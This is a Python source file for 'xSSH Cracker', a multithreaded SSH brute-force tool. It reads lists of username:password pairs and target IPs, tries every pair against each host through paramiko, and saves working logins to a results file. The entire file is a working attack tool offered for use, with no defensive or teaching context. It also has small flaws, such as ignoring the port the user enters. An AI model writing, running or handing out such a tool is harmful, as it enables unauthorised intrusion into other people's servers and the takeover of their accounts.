from threading import Thread, Lock, Event
from pystyle import Colors, Colorate, Center, Write
from datetime import datetime
from multiprocessing import RawValue
from time import sleep
from os.path import exists as file_exists
from contextlib import suppress
from paramiko import AuthenticationException, SSHClient, AutoAddPolicy, SSHException
from logging import CRITICAL, basicConfig

basicConfig(level=CRITICAL)


class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)
        self._lock = Lock()

    def __iadd__(self, value):
        with self._lock:
            self._value.value += value
        return self

    def __int__(self):
        with self._lock:
            data = self._value.value
        return data

    def set(self, value):
        with self._lock:
            self._value.value = value
        return self


class IPSync:
    def __init__(self, ips):
        self.ips = iter(ips)
        self.len = len(ips)
        self.rem = self.len
        self.lock = Lock()
        self.current = None

    def __iter__(self):
        for ip in self.ips:
            with self.lock:
                self.current = ip
                self.rem -= 1
                yield ip

        raise StopIteration

    def __repr__(self):
        return self.current

    def __int__(self):
        return self.rem

    def __len__(self):
        return self.len

    def __str__(self):
        return self.current

class Logger:
    @staticmethod
    def succses(*msg):
        return Logger.log(Colors.green, "+", *msg)

    @staticmethod
    def warning(*msg):
        return Logger.log(Colors.yellow, "!", *msg)

    @staticmethod
    def fail(*msg):
        return Logger.log(Colors.red, "-", *msg)

    @staticmethod
    def log(color, icon, *msg):
        print("%s[%s%s%s] %s%s%s" % (
                                    Colors.gray,
                                    color,
                                    icon,
                                    Colors.gray,
                                    color,
                                    Tools.arrayToString(msg),
                                    Colors.reset))
    
    @staticmethod
    def date():
        time = datetime.now()
        return time.strftime("%Y-%M-%d %H:%M:%S")

class Tools:
    @staticmethod
    def arrayToString(array):
        return " ".join([str(ar) or repr(ar) for ar in array])

    @staticmethod
    def cleanArray(array):
        return [arr.strip() for arr in array]

class Inputs:
    @staticmethod
    def file(*msg):
        def check(data):
            return file_exists(data)
        return Inputs.require(*msg, check=check, checkError="The File dosn't exists")
    
    @staticmethod
    def string(*msg):
        def check(data):
            return len(data) > 3
        return Inputs.require(*msg, check=check)
    
    @staticmethod
    def integer(*msg):
        def check(data):
            return data.isdigit()
        return Inputs.require(*msg, check=check, clazz=int, checkError="Invalid Numeric format")

    @staticmethod
    def require(*msg, check=None, clazz=str, checkError="Invalid String format"):
        while True:
            data = input(Tools.arrayToString(msg)) or ""
            if not data or check(data):
                return clazz(data)
            else:
                Logger.fail(checkError)
    
    
    

class Cracker:
    def __init__(self, userpass_list, sync_ips, port, threads):
        self.threads = threads
        self.userpass_list = Tools.cleanArray(userpass_list)
        self.sync_ips = IPSync(Tools.cleanArray(sync_ips))
        self.port = port
        self.sync_ips_iter = iter(self.sync_ips)
        self.tried = Counter()
        self.tps = Counter()
        self.cracked = Counter()
        self.event = Event()

    def isRunning(self):
        return int(self.tried) < len(self.sync_ips) + 1

    def save(self, target, port, username, password):
        self.cracked += 1
        with open("result.txt", "a+") as f:
            text = "%s:%d@ | %s | %s" % (target, port, username, password)
            f.write(text + "\n")
            Logger.succses(text)

    def start(self):
        for _ in range(self.threads):
            Cracker.Worker(self).start()

        self.event.set()
        while self.isRunning():
            self.tps.set(0)
            sleep(.9)
            print("Current TPS", int(self.tps), end="\r")

        Logger.succses("Cracked: %d Tried %d" % (int(self.cracked), int(self.tried)))

    class Worker(Thread):
        def __init__(self, root):
            super().__init__(daemon=True)
            self.root = root

        def run(self):
            with suppress(StopIteration, RuntimeError):
                while self.root.isRunning():
                    self.crack(next(self.root.sync_ips_iter))
                return

        def crack(self, target, port=22):
            self.root.event.wait()
            try:
                trieds = len(self.root.userpass_list)
                for entry in self.root.userpass_list:
                    try:
                        username, password = entry.split(":")
                        sshClient = SSHClient()
                        try:
                            sshClient.set_missing_host_key_policy(AutoAddPolicy())
                            sshClient.load_system_host_keys()

                            sshClient.connect(target, port, username.strip(),
                                              password.strip(), timeout=4, banner_timeout=1.4,
                                              look_for_keys=False, auth_timeout=1.4)
                            self.root.save(target, port, username, password)
                        finally:
                            sshClient.close()
                        return

                    except AuthenticationException:
                        Logger.fail("[%s] Invalid user or password %s:%s | %d/%d" % (target, username, password, int(self.root.tried), len(self.root.sync_ips)))

                    except Exception as e:
                        if str(e) == "No existing session":
                            trieds -= 1
                            if not trieds:
                                return
                            continue
                        Logger.warning("[%s] %s | %d/%d" % (target, str(e) or repr(e), int(self.root.tried), len(self.root.sync_ips)))
                        return

                    finally:
                        self.root.tps += 1

            finally:
                self.root.tried += 1


if __name__ == "__main__":
    print(Colorate.Horizontal(Colors.red_to_blue, Center.XCenter("""
.-.   .-.  .---.   .---. .-. .-. 
 ) \_/ /  ( .-._) ( .-._)| | | | 
(_)   /  (_) \   (_) \   | `-' | 
  / _ \  _  \ \  _  \ \  | .-. | 
 / / ) \( `-'  )( `-'  ) | | |)| 
`-' (_)-'`----'  `----'  /(  (_) 
                        (__)     
 Hello, Welcome to xSSH Cracker.
""")))
    with suppress(KeyboardInterrupt):
        with open(Inputs.file("User:Password list: "), "r+") as f:
            userpass_list = f.readlines()
            with open(Inputs.file("Ips: "), "r+") as f:
                iplist = f.readlines()
                Cracker(userpass_list, iplist, Inputs.integer("Port: "), Inputs.integer("Threads: ")).start()
